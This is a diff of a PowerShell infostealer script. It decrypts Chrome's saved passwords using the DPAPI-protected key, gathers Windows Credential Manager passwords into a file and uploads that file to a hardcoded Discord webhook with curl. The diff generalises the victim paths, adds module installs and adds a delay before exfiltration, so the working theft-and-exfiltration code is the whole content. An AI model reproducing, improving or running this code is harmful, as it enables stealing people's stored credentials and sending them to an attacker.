@@ -1,7 +1,16 @@
+# Ensure the necessary modules are loaded
+if (-not (Get-Module -ListAvailable -Name "SQLite")) {
+    Install-Module -Name "SQLite" -Force
+}
+
+if (-not (Get-Module -ListAvailable -Name "PSReadLine")) {
+    Install-Module -Name "PSReadLine" -Force
+}
+
 # Function to decrypt Chrome passwords
 function Get-ChromePasswords {
     try {
-        $localStatePath = "$env:C:\Users\Shivam\AppData\Local\Google\Chrome\User Data\Local State"
+        $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
         if (-not (Test-Path $localStatePath)) {
             Write-Output "Chrome local state file not found."
             return @()
@@ -10,7 +19,7 @@ function Get-ChromePasswords {
         $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key) | Select-Object -Skip 5
         $key = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
-        $dbPath = "$env:C:\Users\Shivam\AppData\Local\Google\Chrome\User Data\Local State"
+        $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
         if (-not (Test-Path $dbPath)) {
             Write-Output "Chrome login data file not found."
             return @()
@@ -329,6 +338,8 @@ if ($credentialManagerPasswords.Count -gt 0) {
     Add-Content -Path $outputPath -Value "No Credential Manager passwords found."
 }
 
+# Remove-Item -Path $outputPath
+Start-Sleep -Seconds 20 # Add a delay before upload
 # Upload to Discord
 $webhookUrl = "https://discordapp.com/api/webhooks/1163648209806180373/1a4UKrWxReg-ICzIMM-Q3Pt14l02wOnM3MUdb4LU6RHs_DlGiFjzq_K0jpFB_yFUDP2R"
 $curlCmd = "curl.exe -F `file1=@$outputPath` $webhookUrl"
